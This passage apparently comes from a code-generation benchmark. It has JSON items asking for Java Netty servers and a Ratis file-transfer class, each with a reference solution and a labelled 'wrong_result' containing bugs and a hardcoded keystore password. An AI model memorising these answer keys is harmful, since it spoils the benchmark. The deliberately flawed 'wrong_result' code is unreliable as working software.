    "Canonical_solution": "import com.github.ltsopensource.core.AppContext;\nimport com.github.ltsopensource.core.factory.NamedThreadFactory;\nimport com.github.ltsopensource.core.logger.Logger;\nimport com.github.ltsopensource.remoting.*;\nimport com.github.ltsopensource.remoting.common.RemotingHelper;\nimport com.github.ltsopensource.remoting.exception.RemotingException;\nimport com.github.ltsopensource.remoting.protocol.RemotingCommand;\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.timeout.IdleState;\nimport io.netty.handler.timeout.IdleStateEvent;\nimport io.netty.handler.timeout.IdleStateHandler;\nimport io.netty.util.concurrent.DefaultEventExecutorGroup;\n\nimport java.net.InetSocketAddress;\n\npublic class NettyRemotingServer extends AbstractRemotingServer {\n\n    public static final Logger LOGGER = AbstractRemotingServer.LOGGER;\n\n    private final ServerBootstrap serverBootstrap;\n    private final EventLoopGroup bossSelectorGroup;\n    private final EventLoopGroup workerSelectorGroup;\n    private DefaultEventExecutorGroup defaultEventExecutorGroup;\n    private AppContext appContext;\n\n    public NettyRemotingServer(AppContext appContext, RemotingServerConfig remotingServerConfig) {\n        this(remotingServerConfig, null);\n        this.appContext = appContext;\n    }\n\n    public NettyRemotingServer(RemotingServerConfig remotingServerConfig, final ChannelEventListener channelEventListener) {\n        super(remotingServerConfig, channelEventListener);\n        this.serverBootstrap = new ServerBootstrap();\n        this.bossSelectorGroup = new NioEventLoopGroup(1, new NamedThreadFactory(\"NettyBossSelectorThread_\"));\n        this.workerSelectorGroup = new NioEventLoopGroup(remotingServerConfig.getServerSelectorThreads(), new NamedThreadFactory(\"NettyServerSelectorThread_\", true));\n    }\n\n    @Override\n    protected void serverStart() throws RemotingException {\n        NettyLogger.setNettyLoggerFactory();\n\n        this.defaultEventExecutorGroup = new DefaultEventExecutorGroup(\n                remotingServerConfig.getServerWorkerThreads(),\n                new NamedThreadFactory(\"NettyServerWorkerThread_\")\n        );\n\n        final NettyCodecFactory nettyCodecFactory = new NettyCodecFactory(appContext, getCodec());\n\n        this.serverBootstrap.group(this.bossSelectorGroup, this.workerSelectorGroup)\n                .channel(NioServerSocketChannel.class)\n                .option(ChannelOption.SO_BACKLOG, 65536)\n                .option(ChannelOption.SO_REUSEADDR, true)\n                .childOption(ChannelOption.TCP_NODELAY, true)\n                .localAddress(new InetSocketAddress(this.remotingServerConfig.getListenPort()))\n                .childHandler(new ChannelInitializer<SocketChannel>() {\n                    @Override\n                    public void initChannel(SocketChannel ch) throws Exception {\n                        ch.pipeline().addLast(\n                                defaultEventExecutorGroup,\n                                nettyCodecFactory.getEncoder(),\n                                nettyCodecFactory.getDecoder(),\n                                new IdleStateHandler(remotingServerConfig.getReaderIdleTimeSeconds(),\n                                        remotingServerConfig.getWriterIdleTimeSeconds(), remotingServerConfig.getServerChannelMaxIdleTimeSeconds()),\n                                new NettyConnectManageHandler(),\n                                new NettyServerHandler());\n                    }\n                });\n\n        try {\n            this.serverBootstrap.bind().sync();\n        } catch (InterruptedException e) {\n            throw new RemotingException(\"Start Netty server bootstrap error\", e);\n        }\n    }\n\n    @Override\n    protected void serverShutdown() throws RemotingException {\n        this.bossSelectorGroup.shutdownGracefully();\n        this.workerSelectorGroup.shutdownGracefully();\n\n        if (this.defaultEventExecutorGroup != null) {\n            this.defaultEventExecutorGroup.shutdownGracefully();\n        }\n    }\n\n    class NettyServerHandler extends SimpleChannelInboundHandler<RemotingCommand> {\n        @Override\n        protected void channelRead0(ChannelHandlerContext ctx, RemotingCommand msg) throws Exception {\n            processMessageReceived(new NettyChannel(ctx), msg);\n        }\n    }\n\n    class NettyConnectManageHandler extends ChannelDuplexHandler {\n        @Override\n        public void channelRegistered(ChannelHandlerContext ctx) throws Exception {\n            final String remoteAddress = RemotingHelper.parseChannelRemoteAddr(new NettyChannel(ctx));\n            LOGGER.info(\"SERVER : channelRegistered {}\", remoteAddress);\n            super.channelRegistered(ctx);\n        }\n\n        @Override\n        public void channelUnregistered(ChannelHandlerContext ctx) throws Exception {\n            final String remoteAddress = RemotingHelper.parseChannelRemoteAddr(new NettyChannel(ctx));\n            LOGGER.info(\"SERVER : channelUnregistered, the channel[{}]\", remoteAddress);\n            super.channelUnregistered(ctx);\n        }\n\n        @Override\n        public void channelActive(ChannelHandlerContext ctx) throws Exception {\n            com.github.ltsopensource.remoting.Channel channel = new NettyChannel(ctx);\n            final String remoteAddress = RemotingHelper.parseChannelRemoteAddr(channel);\n            LOGGER.info(\"SERVER: channelActive, the channel[{}]\", remoteAddress);\n            super.channelActive(ctx);\n\n            if (channelEventListener != null) {\n                putRemotingEvent(new RemotingEvent(RemotingEventType.CONNECT, remoteAddress, channel));\n            }\n        }\n\n        @Override\n        public void channelInactive(ChannelHandlerContext ctx) throws Exception {\n            com.github.ltsopensource.remoting.Channel channel = new NettyChannel(ctx);\n            final String remoteAddress = RemotingHelper.parseChannelRemoteAddr(channel);\n            LOGGER.info(\"SERVER: channelInactive, the channel[{}]\", remoteAddress);\n            super.channelInactive(ctx);\n\n            if (channelEventListener != null) {\n                putRemotingEvent(new RemotingEvent(RemotingEventType.CLOSE, remoteAddress, channel));\n            }\n        }\n\n        @Override\n        public void userEventTriggered(ChannelHandlerContext ctx, Object evt) throws Exception {\n            if (evt instanceof IdleStateEvent) {\n                IdleStateEvent event = (IdleStateEvent) evt;\n                com.github.ltsopensource.remoting.Channel channel = new NettyChannel(ctx);\n                final String remoteAddress = RemotingHelper.parseChannelRemoteAddr(channel);\n\n                if (event.state().equals(IdleState.ALL_IDLE)) {\n                    LOGGER.warn(\"SERVER: IDLE [{}]\", remoteAddress);\n                    RemotingHelper.closeChannel(channel);\n                }\n\n                if (channelEventListener != null) {\n                    RemotingEventType remotingEventType = RemotingEventType.valueOf(event.state().name());\n                    putRemotingEvent(new RemotingEvent(remotingEventType, remoteAddress, channel));\n                }\n            }\n            ctx.fireUserEventTriggered(evt);\n        }\n\n        @Override\n        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) throws Exception {\n            com.github.ltsopensource.remoting.Channel channel = new NettyChannel(ctx);\n            final String remoteAddress = RemotingHelper.parseChannelRemoteAddr(channel);\n            LOGGER.warn(\"SERVER: exceptionCaught {}\", remoteAddress, cause);\n\n            if (channelEventListener != null) {\n                putRemotingEvent(new RemotingEvent(RemotingEventType.EXCEPTION, remoteAddress, channel));\n            }\n\n            RemotingHelper.closeChannel(channel);\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "wrong_result": "public class NettyRemotingServer {\n    private final ServerBootstrap serverBootstrap;\n    private final EventLoopGroup bossSelectorGroup;\n    private final EventLoopGroup workerSelectorGroup;\n    private final DefaultEventExecutorGroup defaultEventExecutorGroup;\n    private final AppContext appContext;\n    private final Logger LOGGER;\n    private final ChannelEventListener listener;\n\n    public NettyRemotingServer(AppContext appContext, RemotingServerConfig config) {\n        bossSelectorGroup = new NioEventLoopGroup(1);\n        workerSelectorGroup = new NioEventLoopGroup(config.getWorkerThreadNum());\n        defaultEventExecutorGroup = new DefaultEventExecutorGroup(config.getThreadPoolSize());\n        this.appContext = appContext;\n        this.LOGGER = LoggerFactory.getLogger(NettyRemotingServer.class);\n        listener = null;\n        serverBootstrap = new ServerBootstrap();\n        serverBootstrap.group(bossSelectorGroup, workerSelectorGroup)\n                      .channel(NioServerSocketChannel.class)\n                      .childHandler(new ChannelInitializer<SocketChannel>() {\n                          @Override\n                          protected void initChannel(SocketChannel ch) {\n                              ChannelPipeline p = ch.pipeline();\n                              p.addLast(new IdleStateHandler(config.getIdleTimeoutSeconds(), 0, 0, TimeUnit.SECONDS));\n                              p.addLast(new NettyConnectManageHandler());\n                              p.addLast(new NettyServerHandler());\n                          }\n                      });\n    }\n\n    public NettyRemotingServer(RemotingServerConfig config, ChannelEventListener listener) {\n        bossSelectorGroup = new NioEventLoopGroup(1);\n        workerSelectorGroup = new NioEventLoopGroup(config.getWorkerThreadNum());\n        defaultEventExecutorGroup = new DefaultEventExecutorGroup(config.getThreadPoolSize());\n        this.appContext = null;\n        this.LOGGER = LoggerFactory.getLogger(NettyRemotingServer.class);\n        this.listener = listener;\n        serverBootstrap = new ServerBootstrap();\n        serverBootstrap.group(bossSelectorGroup, workerSelectorGroup)\n                      .channel(NioServerSocketChannel.class)\n                      .childHandler(new ChannelInitializer<SocketChannel>() {\n                          @Override\n                          protected void initChannel(SocketChannel ch) {\n                              ChannelPipeline p = ch.pipeline();\n                              p.addLast(new IdleStateHandler(config.getIdleTimeoutSeconds(), 0, 0, TimeUnit.SECONDS));\n                              p.addLast(new NettyConnectManageHandler());\n                              p.addLast(new NettyServerHandler());\n                          }\n                      });\n    }\n\n    public void serverStart() {\n        ChannelFuture future = serverBootstrap.bind(config.getPort()).syncUninterruptibly();\n        future.channel().closeFuture().syncUninterruptibly();\n    }\n\n    public void serverShutdown() {\n        bossSelectorGroup.shutdownGracefully();\n        workerSelectorGroup.shutdownGracefully();\n        defaultEventExecutorGroup.shutdownGracefully();\n    }\n\n    private class NettyConnectManageHandler extends ChannelInboundHandlerAdapter {\n        @Override\n        public void channelRegistered(ChannelHandlerContext ctx) {\n            LOGGER.info(\"Channel registered: {}\", ctx.channel());\n        }\n\n        @Override\n        public void channelUnregistered(ChannelHandlerContext ctx) {\n            LOGGER.info(\"Channel unregistered: {}\", ctx.channel());\n            if (listener != null) {\n                listener.onChannelUnregistered(ctx.channel());\n            }\n        }\n\n        @Override\n        public void channelActive(ChannelHandlerContext ctx) {\n            LOGGER.info(\"Channel active: {}\", ctx.channel());\n            if (listener != null) {\n                listener.onChannelActive(ctx.channel());\n            }\n        }\n\n        @Override\n        public void channelInactive(ChannelHandlerContext ctx) {\n            LOGGER.info(\"Channel inactive: {}\", ctx.channel());\n            if (listener != null) {\n                listener.onChannelInactive(ctx.channel());\n            }\n        }\n\n        @Override\n        public void userEventTriggered(ChannelHandlerContext ctx, Object evt) {\n            if (evt instanceof IdleStateEvent) {\n                IdleStateEvent event = (IdleStateEvent) evt;\n                if (listener != null) {\n                    listener.onChannelIdle(ctx.channel(), event.state());\n                }\n            }\n        }\n\n        @Override\n        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n            LOGGER.error(\"Exception caught: \", cause);\n            ctx.close();\n        }\n    }\n\n    private class NettyServerHandler extends ChannelInboundHandlerAdapter {\n        @Override\n        public void channelRead0(ChannelHandlerContext ctx, RemotingCommand msg) {\n            if (appContext != null) {\n                RemotingCommand response = appContext.processCommand(msg);\n                ctx.writeAndFlush(response);\n            }\n        }\n    }\n}"
  },
  {
    "Task_id": 218,
    "Instruction": "Task Description: Create a Java class that implements a secure TCP chat server using Netty framework, supporting SSL/TLS encryption for secure communication between clients and the server.\n\nClass Description: SecureChatServer is a Netty-based TCP server that handles secure chat communications. It initializes SSL context, configures server bootstrap with event loop groups, and manages server lifecycle including graceful shutdown.\n\nAttributes:\nPORT: int - The port number on which the server listens for incoming connections (default: 8992)\nsslCtx: SslContext - The SSL context used for secure communication\nbossGroup: EventLoopGroup - The parent event loop group that accepts incoming connections\nworkerGroup: EventLoopGroup - The child event loop group that handles the traffic of accepted connections\n\nMethods:\nmain: main(String[] args) -> void - Entry point that initializes SSL context, configures server, binds to port, and manages server lifecycle\n    - args: String[] - Command line arguments (unused in this implementation)\n    - No explicit return value (void)",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.logging.LogLevel;\nimport io.netty.handler.logging.LoggingHandler;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslContextBuilder;\nimport io.netty.handler.ssl.util.SelfSignedCertificate;\n\npublic final class SecureChatServer {\n\n    static final int PORT = Integer.parseInt(System.getProperty(\"port\", \"8992\"));\n\n    public static void main(String[] args) throws Exception {\n        SelfSignedCertificate ssc = new SelfSignedCertificate();\n        SslContext sslCtx = SslContextBuilder.forServer(ssc.certificate(), ssc.privateKey())\n            .build();\n\n        EventLoopGroup bossGroup = new NioEventLoopGroup(1);\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .handler(new LoggingHandler(LogLevel.INFO))\n             .childHandler(new SecureChatServerInitializer(sslCtx));\n\n            b.bind(PORT).sync().channel().closeFuture().sync();\n        } finally {\n            bossGroup.shutdownGracefully();\n            workerGroup.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "wrong_result": "public class SecureChatServer {\n    static final int PORT = 8992;\n    static SslContext sslCtx;\n    static EventLoopGroup bossGroup;\n    static EventLoopGroup workerGroup;\n\n    public static void main(String[] args) {\n        try {\n            sslCtx = SslContextBuilder.forServer(\"keystore.jks\", \"password\").build();\n            bossGroup = new NioEventLoopGroup(1);\n            workerGroup = new NioEventLoopGroup();\n\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .childHandler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 public void initChannel(SocketChannel ch) throws Exception {\n                     ChannelPipeline p = ch.pipeline();\n                     p.addLast(sslCtx.newHandler(ch.alloc()));\n                 }\n             })\n             .option(ChannelOption.SO_BACKLOG, 100)\n             .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n            ChannelFuture f = b.bind(PORT).sync();\n            f.channel().closeFuture().sync();\n        } catch (Exception e) {\n            e.printStackTrace();\n        } finally {\n            if (bossGroup != null) bossGroup.shutdownGracefully();\n            if (workerGroup != null) workerGroup.shutdownGracefully();\n        }\n    }\n}"
  },
  {
    "Task_id": 22,
    "Instruction": "Task Description: Create a Java abstract class that handles file transfer operations using FileChannel for reading files and DataStreamOutput for writing data, with support for synchronization points during transfer.\n\nClass Description: TransferType is an abstract class that provides a framework for transferring file data in chunks using NIO FileChannel for reading and a DataStreamOutput for writing. It manages buffer sizes, synchronization points, and tracks transfer progress.\n\nAttributes:\n- path: String - The file path to be transferred\n- file: File - The File object representing the file to transfer\n- fileSize: long - The total size of the file in bytes\n- bufferSize: int - The size of the transfer buffer in bytes\n- syncSize: long - The interval size at which to perform synchronization\n- syncPosition: long - The current position for synchronization tracking\n\nMethods:\n- TransferType(String path, DataStream cli) - Constructor - Initializes the transfer with file path and configuration from DataStream client\n- getFile() -> File - Returns the File object being transferred\n- getBufferSize() -> int - Returns the buffer size for transfers\n- getPacketSize(long offset) -> long - Calculates the next packet size based on current offset\n- isSync(long position) -> boolean - Determines if current position requires synchronization\n- transfer(FileStoreClient client, RoutingTable routingTable) -> List<CompletableFuture<DataStreamReply>> - Performs the complete file transfer operation\n- write(FileChannel in, DataStreamOutput out, long offset, List<CompletableFuture<DataStreamReply>> futures) -> long - Abstract method to be implemented by subclasses for writing data\n- toString() -> String - Returns a string representation of the transfer object",
    "Canonical_solution": "import org.apache.ratis.examples.filestore.FileStoreClient;\nimport org.apache.ratis.io.StandardWriteOption;\nimport org.apache.ratis.protocol.DataStreamReply;\nimport org.apache.ratis.protocol.RoutingTable;\nimport org.apache.ratis.thirdparty.io.netty.buffer.ByteBuf;\nimport org.apache.ratis.thirdparty.io.netty.buffer.PooledByteBufAllocator;\nimport org.apache.ratis.util.FileUtils;\nimport org.apache.ratis.util.JavaUtils;\nimport org.apache.ratis.util.Preconditions;\n\nimport java.io.File;\nimport java.io.IOException;\nimport java.nio.MappedByteBuffer;\nimport java.nio.channels.FileChannel;\nimport java.nio.file.StandardOpenOption;\nimport java.util.ArrayList;\nimport java.util.Collections;\nimport java.util.List;\nimport java.util.concurrent.CompletableFuture;\n\nabstract static class TransferType {\n    private final String path;\n    private final File file;\n    private final long fileSize;\n    private final int bufferSize;\n    private final long syncSize;\n    private long syncPosition = 0;\n\n    TransferType(String path, DataStream cli) {\n        this.path = path;\n        this.file = new File(path);\n        this.fileSize = cli.getFileSizeInBytes();\n        this.bufferSize = cli.getBufferSizeInBytes();\n        this.syncSize = cli.getSyncSize();\n\n        final long actualSize = file.length();\n        Preconditions.assertTrue(actualSize == fileSize, () -> \"Unexpected file size: expected size is \"\n                + fileSize + \" but actual size is \" + actualSize + \", path=\" + path);\n    }\n\n    File getFile() {\n        return file;\n    }\n\n    int getBufferSize() {\n        return bufferSize;\n    }\n\n    long getPacketSize(long offset) {\n        return Math.min(bufferSize, fileSize - offset);\n    }\n\n    boolean isSync(long position) {\n        if (syncSize > 0) {\n            if (position >= fileSize || position - syncPosition >= syncSize) {\n                syncPosition = position;\n                return true;\n            }\n        }\n        return false;\n    }\n\n    List<CompletableFuture<DataStreamReply>> transfer(\n            FileStoreClient client, RoutingTable routingTable) throws IOException {\n        if (fileSize <= 0) {\n            return Collections.emptyList();\n        }\n\n        final List<CompletableFuture<DataStreamReply>> futures = new ArrayList<>();\n        final DataStreamOutput out = client.getStreamOutput(file.getName(), fileSize, routingTable);\n        try (FileChannel in = FileUtils.newFileChannel(file, StandardOpenOption.READ)) {\n            for (long offset = 0L; offset < fileSize; ) {\n                offset += write(in, out, offset, futures);\n            }\n        } catch (Throwable e) {\n            throw new IOException(\"Failed to transfer \" + path);\n        } finally {\n            futures.add(out.closeAsync());\n        }\n        return futures;\n    }\n\n    abstract long write(FileChannel in, DataStreamOutput out, long offset,\n                       List<CompletableFuture<DataStreamReply>> futures) throws IOException;\n\n    @Override\n    public String toString() {\n        return JavaUtils.getClassSimpleName(getClass()) + \"{\" + path + \", size=\" + fileSize + \"}\";\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 9,
    "wrong_result": "public abstract class TransferType {\n    protected String path;\n    protected File file;\n    protected long fileSize;\n    protected int bufferSize;\n    protected long syncSize;\n    protected long syncPosition;\n\n    public TransferType(String path, DataStream cli) {\n        this.path = path;\n        this.file = new File(path);\n        this.fileSize = file.length();\n        this.bufferSize = cli.getBufferSize();\n        this.syncSize = cli.getSyncSize();\n        this.syncPosition = 0;\n    }\n\n    public File getFile() {\n        return file;\n    }\n\n    public int getBufferSize() {\n        return bufferSize;\n    }\n\n    public long getPacketSize(long offset) {\n        long remaining = fileSize - offset;\n        return Math.min(bufferSize, remaining);\n    }\n\n    public boolean isSync(long position) {\n        return syncSize > 0 && position % syncSize == 0;\n    }\n\n    public abstract List<CompletableFuture<DataStreamReply>> transfer(FileStoreClient client, RoutingTable routingTable);\n\n    public abstract long write(FileChannel in, DataStreamOutput out, long offset, List<CompletableFuture<DataStreamReply>> futures);\n\n    @Override\n    public String toString() {\n        return \"TransferType{\" +\n                \"path='\" + path + '\\'' +\n                \", file=\" + file +\n                \", fileSize=\" + fileSize +\n                \", bufferSize=\" + bufferSize +\n                \", syncSize=\" + syncSize +\n                \", syncPosition=\" + syncPosition +\n                '}';\n    }\n}"
  },
  {
    "Task_id": 220,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using Netty framework to handle client connections and process requests, with optional SSL support for secure communication.\n\nClass Description: The FactorialServer class is a Netty-based TCP server that listens for incoming client connections on a specified port. It supports both plain and SSL-encrypted connections, and uses a separate initializer class to configure the channel pipeline for request processing.\n\nAttributes:\n- SSL: boolean - Flag indicating whether SSL encryption should be enabled\n- PORT: int - The port number on which the server will listen for connections\n\nMethods:\n- start(): void - Starts the Netty TCP server with the configured settings. Handles server initialization, binding to the specified port, and proper resource cleanup on shutdown. Throws Exception if any error occurs during server startup.\n\nInput: None (Configuration is done through system properties: \"ssl\" for enabling SSL and \"port\" for specifying the server port)\n\nOutput: None (The server runs continuously until shutdown)",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.logging.LogLevel;\nimport io.netty.handler.logging.LoggingHandler;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.util.SelfSignedCertificate;\n\npublic final class FactorialServer {\n\n    static final boolean SSL = System.getProperty(\"ssl\") != null;\n    static final int PORT = Integer.parseInt(System.getProperty(\"port\", \"8322\"));\n\n    public void start() throws Exception {\n        final SslContext sslCtx;\n        if (SSL) {\n            SelfSignedCertificate ssc = new SelfSignedCertificate();\n            sslCtx = SslContext.newServerContext(ssc.certificate(), ssc.privateKey());\n        } else {\n            sslCtx = null;\n        }\n\n        EventLoopGroup bossGroup = new NioEventLoopGroup(1);\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .handler(new LoggingHandler(LogLevel.INFO))\n             .childHandler(new FactorialServerInitializer(sslCtx));\n\n            b.bind(PORT).sync().channel().closeFuture().sync();\n        } finally {\n            bossGroup.shutdownGracefully();\n            workerGroup.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "wrong_result": "public class FactorialServer {\n    private final boolean ssl;\n    private final int port;\n\n    public FactorialServer() {\n        this.ssl = Boolean.getBoolean(\"ssl\");\n        this.port = Integer.getInteger(\"port\", 8080);\n    }\n\n    public void start() throws Exception {\n        EventLoopGroup bossGroup = new NioEventLoopGroup(1);\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .childHandler(new ServerInitializer(ssl));\n            Channel ch = b.bind(port).sync().channel();\n            ch.closeFuture().await();\n        } finally {\n            bossGroup.shutdownGracefully();\n            workerGroup.shutdownGracefully();\n        }\n    }\n\n    private static class ServerInitializer extends ChannelInitializer<SocketChannel> {\n        private final boolean ssl;\n\n        ServerInitializer(boolean ssl) {\n            this.ssl = ssl;\n        }\n\n        @Override\n        protected void initChannel(SocketChannel ch) {\n            ChannelPipeline p = ch.pipeline();\n            if (ssl) {\n                SslContext sslContext = SslContextBuilder.forServer()\n                        .trustManager(TrustManagerFactory.getDefaultInstance(TrustManagerFactory.getDefaultAlgorithm()))\n                        .keyManager(KeyManagerFactory.getDefaultInstance(KeyManagerFactory.getDefaultAlgorithm(), new File(\"keystore.jks\"), \"password\".toCharArray()))\n                        .build();\n                p.addLast(sslContext.newHandler(ch.alloc()));\n            }\n            p.addLast(new StringDecoder(CharsetUtil.UTF_8));\n            p.addLast(new StringEncoder(CharsetUtil.UTF_8));\n            p.addLast(new CustomHandler());\n        }\n    }\n\n    private static class CustomHandler extends SimpleChannelInboundHandler<String> {\n        @Override\n        protected void channelRead0(ChannelHandlerContext ctx, String msg) {\n            try {\n                int n = Integer.parseInt(msg);\n                int result = 1;\n                for (int i = 1; i <= n; i++) {\n                    result *= i;\n                }\n                ctx.writeAndFlush(\"Factorial of \" + n + \" is \" + result);\n            } catch (NumberFormatException e) {\n                ctx.writeAndFlush(\"Invalid input\");\n            }\n        }\n    }\n\n    public static void main(String[] args) {\n        new FactorialServer().start();\n    }\n}"
  },
  {
    "Task_id": 222,
    "Instruction": "Task Description: Implement a TCP server using Java Netty framework that can handle custom protocol messages with proper encoding/decoding and processing.\n\nClass Description: ProtocolServer is a Netty-based TCP server implementation that listens on a specified port, handles incoming connections, and processes custom protocol messages using dedicated encoder/decoder and handler components.\n\nAttributes:\nport: int - The port number on which the server will listen for incoming connections\nMAX_FRAME_LENGTH: static final int - Maximum allowed frame length for incoming messages (1MB)\nLENGTH_FIELD_LENGTH: static final int - Length of the length field in the protocol (4 bytes)\nLENGTH_FIELD_OFFSET: static final int - Offset of the length field in the protocol (6 bytes)\nLENGTH_ADJUSTMENT: static final int - Adjustment value for the length field (0)\nINITIAL_BYTES_TO_STRIP: static final int - Number of bytes to strip from the beginning of the message (0)\n\nMethods:\nProtocolServer(int port) -> None - Constructor that initializes the server with the specified port number\nrun() -> void - Starts the Netty server, configures the pipeline with protocol handlers, and begins listening for connections (throws Exception)",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\n\npublic class ProtocolServer {\n\n    private int port;\n    \n    private static final int MAX_FRAME_LENGTH = 1024 * 1024;\n    private static final int LENGTH_FIELD_LENGTH = 4;\n    private static final int LENGTH_FIELD_OFFSET = 6;\n    private static final int LENGTH_ADJUSTMENT = 0;\n    private static final int INITIAL_BYTES_TO_STRIP = 0;\n    \n    public ProtocolServer(int port) {\n        this.port = port;\n    }\n\n    public void run() throws Exception {\n        EventLoopGroup bossGroup = new NioEventLoopGroup();\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .childHandler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 public void initChannel(SocketChannel ch) throws Exception {\n                    ch.pipeline().addLast(\"decoder\",\n                            new ProtocolDecoder(MAX_FRAME_LENGTH,\n                                    LENGTH_FIELD_OFFSET,LENGTH_FIELD_LENGTH, \n                                    LENGTH_ADJUSTMENT, INITIAL_BYTES_TO_STRIP));\n                    ch.pipeline().addLast(\"encoder\", new ProtocolEncoder());\n                    ch.pipeline().addLast(new ProtocolServerHandler());\n                 }\n             })\n             .option(ChannelOption.SO_BACKLOG, 128)\n             .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n            ChannelFuture f = b.bind(port).sync();\n            System.out.println(\"Server start listen at \" + port);\n            f.channel().closeFuture().sync();\n\n        } finally {\n            workerGroup.shutdownGracefully();\n            bossGroup.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "wrong_result": "public class ProtocolServer {\n    private final int port;\n    public static final int MAX_FRAME_LENGTH = 1024 * 1024;\n    public static final int LENGTH_FIELD_LENGTH = 4;\n    public static final int LENGTH_FIELD_OFFSET = 6;\n    public static final int LENGTH_ADJUSTMENT = 0;\n    public static final int INITIAL_BYTES_TO_STRIP = 0;\n\n    public ProtocolServer(int port) {\n        this.port = port;\n    }\n\n    public void run() throws Exception {\n        EventLoopGroup bossGroup = new NioEventLoopGroup(1);\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .childHandler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 public void initChannel(SocketChannel ch) throws Exception {\n                     ChannelPipeline p = ch.pipeline();\n                     p.addLast(new LengthFieldBasedFrameDecoder(\n                         MAX_FRAME_LENGTH, LENGTH_FIELD_OFFSET, LENGTH_FIELD_LENGTH, \n                         LENGTH_ADJUSTMENT, INITIAL_BYTES_TO_STRIP));\n                     p.addLast(new LengthFieldPrepender(LENGTH_FIELD_LENGTH));\n                     p.addLast(new ChannelInboundHandlerAdapter() {\n                         @Override\n                         public void channelRead(ChannelHandlerContext ctx, Object msg) throws Exception {\n                             ByteBuf buffer = (ByteBuf) msg;\n                             try {\n                                 byte[] data = new byte[buffer.readableBytes()];\n                                 buffer.readBytes(data);\n                                 String message = new String(data, Charset.defaultCharset());\n                                 System.out.println(\"Received: \" + message);\n                             } finally {\n                                 buffer.release();\n                             }\n                         }\n                     });\n                 }\n             })\n             .option(ChannelOption.SO_BACKLOG, 128)\n             .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n            ChannelFuture f = b.bind(port).sync();\n            f.channel().closeFuture().sync();\n        } finally {\n            bossGroup.shutdownGracefully();\n            workerGroup.shutdownGracefully();\n        }\n    }\n}"
  },
  {
    "Task_id": 223,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using Netty framework, capable of handling both secure (SSL) and non-secure connections on the same port.\n\nClass Description: PortUnificationServer is a Netty-based TCP server that listens on a specified port and can handle both SSL and plaintext connections through port unification. It uses a boss-worker thread model for efficient connection handling.\n\nAttributes:\nPORT: int - The port number on which the server will listen for incoming connections (default: 8080)\n\nMethods:\nmain: main(String[] args) -> void - The entry point of the application that:\n1. Creates a self-signed SSL certificate for testing\n2. Sets up Netty's event loop groups\n3. Configures the server bootstrap with channel type and handlers\n4. Binds to the specified port and starts the server\n5. Handles graceful shutdown of resources\n\nThe method throws Exception to handle potential errors during server setup and operation.",
